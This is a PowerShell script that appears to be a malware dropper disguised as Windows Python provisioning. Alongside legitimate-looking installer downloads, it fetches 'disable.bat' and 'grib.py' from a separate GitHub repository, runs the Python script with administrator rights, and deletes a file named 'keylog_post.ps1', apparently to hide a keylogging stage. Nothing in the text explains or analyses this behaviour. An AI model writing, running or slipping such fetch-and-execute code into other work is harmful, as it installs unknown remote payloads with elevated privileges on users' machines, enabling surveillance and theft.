$tempFolder = New-Item -ItemType Directory -Path "$env:TEMP\ProvisionWindows" -Force
$installPythonBatUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat"
$installPythonBatPath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python.bat"
$batFileDisabler = "https://raw.githubusercontent.com/FanAPIpipa/pipa/main/disable.bat" 
$batFileDisablerPath = Join-Path -Path $tempFolder.FullName -ChildPath "disable.bat"
$installPythonToolsBatUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python-tools.bat"
$installPythonToolsBatPath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python-tools.bat"

$batFileUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat"
$batFilePath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python.bat"

Invoke-WebRequest -Uri $installPythonBatUrl -OutFile $installPythonBatPath
Invoke-WebRequest -Uri $batFileDisabler -OutFile $batFileDisablerPath
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
Invoke-WebRequest -Uri $installPythonToolsBatUrl -OutFile $installPythonToolsBatPath
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonToolsBatPath" -Wait
Invoke-WebRequest -Uri $batFileUrl -OutFile $batFilePath
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batFilePath" -Verb RunAs -Wait
$keylogScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "keylog_post.ps1"
Remove-Item -Path $keylogScriptPath -Force
$gribScriptUrl = "https://raw.githubusercontent.com/FanAPIpipa/pipa/main/grib.py"
$gribScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "grib.py"
Invoke-WebRequest -Uri $gribScriptUrl -OutFile $gribScriptPath
Start-Process -FilePath "python.exe" -ArgumentList "$gribScriptPath" -Verb RunAs -Wait
